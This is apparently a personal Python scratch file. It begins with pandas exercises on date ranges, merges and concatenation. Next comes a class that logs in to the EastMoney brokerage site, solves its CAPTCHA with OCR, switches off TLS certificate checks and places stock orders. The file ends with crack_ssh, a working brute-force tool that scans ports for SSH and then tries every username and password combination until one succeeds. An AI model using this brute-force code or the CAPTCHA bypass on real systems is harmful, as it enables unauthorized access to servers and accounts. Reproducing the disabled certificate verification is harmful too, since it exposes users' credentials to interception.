    pd.period_range('1/1/2011', '1/1/2012', freq='M')
    pd.period_range(start='2014-01', freq='3M', periods=4)
    pd.period_range(start=pd.Period('2017Q1', freq='Q'), end=pd.Period('2017Q2', freq='Q'), freq='M')
    pd.Period('2017Q2').to_timestamp(how='Start')
    pd.to_datetime('2017Q2')
    s = pd.Series(pd.timedelta_range('1 day 00:00:05', periods=4, freq='s'))
    s = pd.Series(pd.date_range('20130101 09:10:12', periods=4, freq='M', tz='Asia/Shanghai'))
    s[s.dt.day == 2]
    s.str.lower()
    stz = s.dt.tz_localize('US/Eastern')
    s.dt.strftime('%Y/%m/%d')
    index = pd.date_range('1/1/2000', periods=8)
    df = pd.DataFrame(np.random.randn(8, 3), index=index, columns=['A', 'B', 'C'])
    ser = pd.Series(pd.date_range('2000', periods=2, tz="Asia/ShangHai"))
    d = ser.to_numpy()
df1 = pd.DataFrame({'id': list("abcd"), 'age': [25, 32, 0, 24]}, index=list("abcd"))
df2 = pd.DataFrame({'id': list("abade"), 'payment': [100, 200, 150, 140, 300]}, index=list("abade"))
df4 = pd.DataFrame({'id': list("abce"), 'age': [0, 32, 31, 24]}, index=list("efgh"))
ser1=pd.Series(['US','CN','UK', 'DD'],index=list('abce'), name='series')
df1.merge(df2, how='left', left_index=True, right_index=True)
df1.merge(df4, how='left', on=['id'])
df1.merge(df2, how='right', on='id')
df1.merge(df2, how='outer')
df1.merge(df2, how='inner')
df1.merge(df4, how='inner', on='id')
# axis=0，按相同的列进行拼接，ignore_index=True 忽略原有的索引，合并排序
pd.concat([df1,df2], axis=0)
pd.concat([df1,df4], axis=1)
pd.concat([df1, df1], axis=1)
pd.concat([df1, ser1], axis=1)
pd.concat([df1, ser1], axis=1, join='inner')
df1.merge(df2, how='outer')

class EastMoney(object):
    def __init__(self, user='320400074792', pwd='xxxxxxxxx'):
        self.user = user
        self.pwd = pwd
        self.token = None
        self.domain = 'https://jywg.18.cn'
        self.s = requests.Session()
        self.s.verify = False

    def auto_login(self):
        if self.token and self.account():
            print('already logined in')
            return
        import ddddocr
        while True:
            public_key = '-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDHdsyxT66pDG4p73yope7jxA92\nc0AT4qIJ' \
                         '/xtbBcHkFPK77upnsfDTJiVEuQDH+MiMeb+XhCLNKZGp0yaUU6GlxZdp\n+nLW8b7Kmijr3iepaDhcbVTsYBWchaWUXauj9Lrhz58' \
                         '/6AE/NF0aMolxIGpsi+ST\n2hSHPu3GSXMdhPCkWQIDAQAB\n-----END PUBLIC KEY----- '
            rsakey = RSA.importKey(public_key)
            cipher = PKCS1_v1_5.new(rsakey)
            cipher_text = base64.b64encode(cipher.encrypt(self.pwd.encode(encoding='utf-8')))
            password = cipher_text.decode('utf8')
            random_number = '0.305%d' % random.randint(100000, 900000)
            req = self.s.get(f'{self.domain}/Login/YZM?randNum={random_number}')
            identify_code = ddddocr.DdddOcr().classification(req.content)
            headers = {
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/536.66',
                'Host': 'jywg.18.cn', 'Pragma': 'no-cache', 'Connection': 'keep-alive', 'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7',
                'Cache-Control': 'no-cache', 'Referer': 'https://jywg.18.cn/Login?el=1&clear=1', 'X-Requested-With': 'XMLHttpRequest',
                'gw_reqtimestamp': str(int(round(time.time() * 1000))),
                'content-type': 'application/x-www-form-urlencoded'
            }
            params = {
                'duration': 1800, 'password': password, 'identifyCode': identify_code, 'type': 'Z', 'userId': self.user,
                'randNumber': random_number, 'authCode': '', 'secInfo': ''
            }
            self.s.headers.update(headers)
            login_res = self.s.post(f'{self.domain}/Login/Authentication', data=params).json()
            if login_res['Status'] != 0:
                print(login_res)
                time.sleep(3)
            else:
                self.s.headers['cookie'] = '; '.join([f'{k}={v}' for k, v in self.s.cookies.get_dict().items()])  # 多余
                break
        content = self.s.get(f'{self.domain}/Trade/Buy').text
        self.token = re.search('value="(.*?)"', content).group(1)

    def account(self):
        res = self.s.get(f'{self.domain}/Com/queryAssetAndPositionV1?validatekey={self.token}').json()
        if res['Status'] == 0:
            assets = res['Data'][0]
            mps = {'Cbjg': 'buy', 'Ckyk': 'profit', 'Gddm': 'account', 'Kysl': 'cash', 'Ykbl': 'ykbl', 'Zjzh': 'uid', 'Zqdm': 'code', 'Zqmc': 'name','Zqsl': 'vol', 'Zxjg': 'price'}
            return Dot({
                'balance': float(assets['Zzc']),
                'withDraw': float(assets['Kqzj']),
                'cash': float(assets['Kyzj']),
                'profit': float(assets['Ljyk']),
                'market': float(assets['Zzc']) - float(assets['Kyzj']),
                'positions': [{mps[k]: v for k, v in p.items() if k in mps} for p in assets['positions']]
            })

    def order(self, code, price=0, vol=0, buy=True):
        if self.account().cash < price * vol and buy or vol <= 0:
            print('没有足够的现金进行操作或数量不能为0')
            return
        params = {'stockCode': code, 'price': price, 'amount': vol, 'zqmc': 'unknown', 'tradeType': 'B' if buy else 'S'}
        response = self.s.post(f'{self.domain}/Trade/SubmitTradeV2?validatekey={self.token}', data=params).json()
        if response['Status'] == 0:
            return response
        print('下单失败, %s' % json.dumps(response, ensure_ascii=False))
def crack_ssh(host):
    import itertools
    import string
    import paramiko
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    port = 22
    for p in range(10000):
        print(p)
        try:
            client.connect(host, port=p, username='root', password='123', timeout=5)
        except paramiko.AuthenticationException:
            port = p
            break
        except Exception as e:
            pass
    else:
        print('找不到端口')
        return
    print(f'找到了端口为{port}')
    for i in range(3, 10):
        for guess in itertools.product(string.ascii_letters, repeat=i):
            user = ''.join(guess)
            for j in range(20):
                print(f'尝试密码长度{j}')
                for k in itertools.product(string.ascii_letters + string.digits + '!#$%&,-.=@^_~', repeat=j):
                    pwd = ''.join(k)
                    try:
                        client.connect(host, port=port, username=user, password=pwd, timeout=3)
                        msg = f"登录成功 ssh -P {port} {user}@{host} {pwd}"
                        print(msg)
                        return msg
                    except Exception as e:
                        client.close()
    print('破解不了')
